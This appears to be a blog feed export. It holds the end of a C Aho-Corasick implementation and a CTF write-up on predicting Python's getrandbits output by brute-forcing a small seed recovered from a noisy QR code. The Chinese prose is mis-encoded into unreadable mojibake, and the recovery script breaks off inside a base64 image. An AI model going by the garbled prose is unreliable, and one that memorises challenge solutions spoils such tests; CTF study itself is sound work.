TrieNode));</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ALPHABET_SIZE; i++) &#123;</span><br><span class="line">            node-&gt;children[i] = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        node-&gt;fail = <span class="literal">NULL</span>;</span><br><span class="line">        node-&gt;isEndOfWord = <span class="number">0</span>;</span><br><span class="line">        node-&gt;depth = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ’å…¥å­—ç¬¦ä¸²åˆ° Trie æ ‘</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="keyword">struct</span> TrieNode* root, <span class="type">const</span> <span class="type">char</span>* key)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; key[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> index = key[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;children[index] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            node-&gt;children[index] = createTrieNode();</span><br><span class="line">        &#125;</span><br><span class="line">        node = node-&gt;children[index];</span><br><span class="line">        node-&gt;depth = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node-&gt;isEndOfWord = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ„å»ºACè‡ªåŠ¨æœºçš„å¤±è´¥æŒ‡é’ˆ</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildACAutomaton</span><span class="params">(<span class="keyword">struct</span> TrieNode* root)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span> <span class="title">queue</span> =</span> &#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å°†æ ¹èŠ‚ç‚¹çš„å­èŠ‚ç‚¹å…¥é˜Ÿå¹¶è®¾ç½®å¤±è´¥æŒ‡é’ˆä¸ºæ ¹èŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ALPHABET_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;children[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            enqueue(&amp;<span class="built_in">queue</span>, root-&gt;children[i]);</span><br><span class="line">            root-&gt;children[i]-&gt;fail = root;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!isEmpty(&amp;<span class="built_in">queue</span>)) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">current</span> =</span> dequeue(&amp;<span class="built_in">queue</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¤„ç†å½“å‰èŠ‚ç‚¹çš„å­èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ALPHABET_SIZE; i++) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">child</span> =</span> current-&gt;children[i];</span><br><span class="line">            <span class="keyword">if</span> (child != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                enqueue(&amp;<span class="built_in">queue</span>, child);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è®¾ç½®å¤±è´¥æŒ‡é’ˆ</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">fail</span> =</span> current-&gt;fail;</span><br><span class="line">                <span class="keyword">while</span> (fail != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (fail-&gt;children[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        child-&gt;fail = fail-&gt;children[i];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    fail = fail-&gt;fail;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (fail == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    child-&gt;fail = root;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾å…³é”®è¯</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findKeywords</span><span class="params">(<span class="keyword">struct</span> TrieNode* root, <span class="type">const</span> <span class="type">char</span>* text)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">current</span> =</span> root;</span><br><span class="line">    <span class="type">int</span> charIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; text[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> index = text[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (current-&gt;children[index] == <span class="literal">NULL</span> &amp;&amp; current != root) &#123;</span><br><span class="line">            current = current-&gt;fail;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;children[index];</span><br><span class="line">        <span class="keyword">if</span> (current == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            current = root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">temp</span> =</span> current;</span><br><span class="line">        <span class="keyword">while</span> (temp != root) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp-&gt;isEndOfWord) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;å…³é”®è¯ \&quot;%.*s\&quot; å‡ºç°åœ¨ä½ç½® %d\n&quot;</span>, temp-&gt;depth, text + charIndex - temp-&gt;depth, charIndex - temp-&gt;depth);</span><br><span class="line">            &#125;</span><br><span class="line">            temp = temp-&gt;fail;</span><br><span class="line">        &#125;</span><br><span class="line">        charIndex++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¥é˜Ÿæ“ä½œ</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">enqueue</span><span class="params">(<span class="keyword">struct</span> Queue* <span class="built_in">queue</span>, <span class="keyword">struct</span> TrieNode* data)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span>* <span class="title">newNode</span> =</span> (<span class="keyword">struct</span> QueueNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> QueueNode));</span><br><span class="line">    <span class="keyword">if</span> (newNode == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;data = data;</span><br><span class="line">    newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isEmpty(<span class="built_in">queue</span>)) &#123;</span><br><span class="line">        <span class="built_in">queue</span>-&gt;front = newNode;</span><br><span class="line">        <span class="built_in">queue</span>-&gt;rear = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">queue</span>-&gt;rear-&gt;next = newNode;</span><br><span class="line">        <span class="built_in">queue</span>-&gt;rear = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡ºé˜Ÿæ“ä½œ</span></span><br><span class="line"><span class="keyword">struct</span> TrieNode* <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> Queue* <span class="built_in">queue</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isEmpty(<span class="built_in">queue</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;é˜Ÿåˆ—ä¸ºç©º\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span>* <span class="title">frontNode</span> =</span> <span class="built_in">queue</span>-&gt;front;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">data</span> =</span> frontNode</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-2023-gift_in_qrcode(revenge)</title>
      <link href="/2023/08/29/nssctf-2023-%E9%83%A8%E5%88%86writeup/"/>
      <url>/2023/08/29/nssctf-2023-%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®æ¥æº"><a href="#é¢˜ç›®æ¥æº" class="headerlink" title="é¢˜ç›®æ¥æº"></a>é¢˜ç›®æ¥æº</h2><p>NSSCTF-2023-misc-gift_in_qrcode(revenge)</p><h2 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h2><p>getrandbits(8) pythonä¼ªéšæœºæ•° çˆ†ç ´è„šæœ¬çš„ç¼–å†™</p><h2 id="é¢˜ç›®å†…å®¹"><a href="#é¢˜ç›®å†…å®¹" class="headerlink" title="é¢˜ç›®å†…å®¹"></a>é¢˜ç›®å†…å®¹</h2><p>main.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import qrcode</span><br><span class="line">from PIL import Image</span><br><span class="line">from random import randrange, getrandbits, seed</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">flag = os.getenv(&quot;FLAG&quot;)</span><br><span class="line">if flag == None:</span><br><span class="line">    flag = &quot;flag&#123;test&#125;&quot;</span><br><span class="line"></span><br><span class="line">secret_seed = randrange(1, 1000)</span><br><span class="line">seed(secret_seed)</span><br><span class="line">reveal = []</span><br><span class="line">for i in range(20):</span><br><span class="line">    reveal.append(str(getrandbits(8)))</span><br><span class="line">target = getrandbits(8)</span><br><span class="line">reveal = &quot;,&quot;.join(reveal)</span><br><span class="line"></span><br><span class="line">img_qrcode = qrcode.make(reveal)</span><br><span class="line">img_qrcode = img_qrcode.crop((35, 35, img_qrcode.size[0] - 35, img_qrcode.size[1] - 35))</span><br><span class="line"></span><br><span class="line">offset, delta, rate = 50, 3, 5</span><br><span class="line">img_qrcode = img_qrcode.resize(</span><br><span class="line">    (int(img_qrcode.size[0] / rate), int(img_qrcode.size[1] / rate)), Image.LANCZOS</span><br><span class="line">)</span><br><span class="line">img_out = Image.new(&quot;RGB&quot;, img_qrcode.size)</span><br><span class="line">for y in range(img_qrcode.size[1]):</span><br><span class="line">    for x in range(img_qrcode.size[0]):</span><br><span class="line">        pixel_qrcode = img_qrcode.getpixel((x, y))</span><br><span class="line">        if pixel_qrcode == 255:</span><br><span class="line">            img_out.putpixel(</span><br><span class="line">                (x, y),</span><br><span class="line">                (</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                ),</span><br><span class="line">            )</span><br><span class="line">        else:</span><br><span class="line">            img_out.putpixel(</span><br><span class="line">                (x, y),</span><br><span class="line">                (</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                ),</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">img_out.save(&quot;qrcode.png&quot;)</span><br><span class="line">with open(&quot;qrcode.png&quot;, &quot;rb&quot;) as f:</span><br><span class="line">    data = f.read()</span><br><span class="line">print(&quot;This my gift:&quot;)</span><br><span class="line">print(base64.b64encode(data).decode(), &quot;\\n&quot;)</span><br><span class="line"></span><br><span class="line">ans = input(&quot;What&#x27;s your answer:&quot;)</span><br><span class="line">if ans == str(target):</span><br><span class="line">    print(flag)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;No no no!&quot;)</span><br></pre></td></tr></table></figure><p>ncè¿ä¸Šå»ï¼Œä¼šç»™ä¸€é•¿ä¸²çš„base64æ•°æ®ï¼Œç„¶åè¦æ±‚è¾“å…¥answerã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><ul><li>é¦–å…ˆæ˜¯ç”Ÿæˆrevealçš„åœ°æ–¹ï¼Œè¿˜æœ‰target[ä¹Ÿå°±æ˜¯æˆ‘ä»¬æœ€åè¦æ±‚çš„answer] <code>secret_seed = randrange(1, 1000) seed(secret_seed) reveal = [] for i in range(20): reveal.append(str(getrandbits(8))) target = getrandbits(8) reveal = &quot;,&quot;.join(reveal)</code></li><li>å…ˆç”¨getrandbits(8)ç”Ÿæˆäº†20ä¸ªæ•°å­—ï¼Œæ”¾åˆ°revealé‡Œé¢äº†ï¼Œç„¶ååˆç”Ÿæˆäº†targetï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯åˆ©ç”¨ä¼ªéšæœºæ•°çš„åŸç†ï¼Œé€šè¿‡é‚£20ä¸ªæ•°å»çˆ†ç ´ç¬¬21ä½</li><li>è€Œé¢˜ç›®åé¢çš„å†…å®¹å°±æ˜¯æŠŠè¿™20ä¸ªæ•°æ®çš„ä¿¡æ¯ç”Ÿæˆä¸€ä¸ªäºŒç»´ç å†æŠŠä¿¡æ¯çš„base64ç¼–ç è¾“å‡ºç»™æˆ‘ä»¬ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¸€ä¸ªè„šæœ¬æŠŠè¿™ä¸ªäºŒç»´ç è¿˜åŸå‡ºæ¥ã€‚</li></ul><h2 id="è§£ç­”"><a href="#è§£ç­”" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h2><p>é¦–å…ˆæ˜¯äºŒç»´ç çš„è¿˜åŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># auther:youzhi</span><br><span class="line"># time:2023/8/27</span><br><span class="line">import base64</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">base64_encoded_data = &quot;&quot;&quot;</span><br><span class="line">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